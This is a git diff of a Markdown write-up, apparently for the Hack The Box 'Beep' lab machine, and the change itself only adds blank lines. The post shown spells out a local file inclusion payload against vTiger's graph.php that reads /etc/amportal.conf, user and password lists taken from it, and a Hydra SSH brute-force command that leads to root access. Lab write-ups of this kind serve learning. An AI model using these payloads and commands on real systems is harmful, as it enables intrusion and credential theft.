@@ -21,9 +21,11 @@ coverImage: '/images/htb/covers/beep-cover.png'
 
 ![Beep Nmap](/images/htb/machines/Beep/nmap.png "NMAP")
 
+
 ### Web Page
 
 ![Beep WebPage](/images/htb/machines/Beep/webpage.png "Web Page")
+
 
 ## Exploitation
 
@@ -32,9 +34,11 @@ Using `searchsploit elastix` we find:
 
 ![SearchSploit](/images/htb/machines/Beep/searchsploit.png "Searchsploit Output")
 
+
 Trying out the local file inclusion vulnerability
 
 ![Exploit Documentation](/images/htb/machines/Beep/exploitcode.png "LFI graph.php")
+
 
 `LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`  
 
@@ -43,9 +47,12 @@ Simply viewing the source code, we see the data in a readable format
 
 ![Exploit Page Source Code](/images/htb/machines/Beep/exploitpage.png "Source Code")
 
+
 So we make 2 lists for possible users and passwords
 
+
 #### Users.txt(users on my local machine)
+
   ```
   root
   mysql
@@ -54,7 +61,9 @@ So we make 2 lists for possible users and passwords
   spamfilter
   fanish
   ```
+
 #### password.txt(pws on my local machine)
+
   ```
   asterisk
   amp109
@@ -62,18 +71,22 @@ So we make 2 lists for possible users and passwords
   passw0rd
   ```
 
+
 ### Hydra
+
 After creating the lists of users and passwords we simply run Hydra to check possible ssh combinations.  
 Using the command:  
 `hydra -L users -P pws ssh://10.10.10.7`
 
 ![Hydra](/images/htb/machines/Beep/hydra.png "Hydra")
 
+
 ### Root Owned
 
 Now we simply ssh, with the password that we got as root and we're in
 
 ![Rooted](/images/htb/machines/Beep/owned.png "Pwnage")
+
 
 Simply traverse to the `/root` directory for `root.txt` and to `home/fanis` for `user.txt`
 
